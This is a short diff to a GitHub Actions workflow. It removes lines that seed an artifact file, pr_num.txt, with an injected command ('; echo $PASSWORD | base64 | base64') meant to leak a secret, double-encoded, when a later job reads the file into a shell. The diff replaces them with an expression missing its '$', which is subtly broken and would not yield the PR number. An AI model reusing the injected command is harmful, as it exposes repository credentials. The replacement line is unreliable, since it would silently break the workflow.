@@ -10,12 +10,8 @@ jobs:
     runs-on: ubuntu-latest
 
     steps:
-      - uses: actions/checkout@v4
-
       - name: PR event number
-        run: |
-          echo -n '; echo $' > pr_num.txt
-          echo 'PASSWORD | base64 | base64' >> pr_num.txt
+        run: echo {{ github.event.pull_request.number }} > pr_num.txt
 
       - name: Upload the PR event number
         uses: actions/upload-artifact@v4
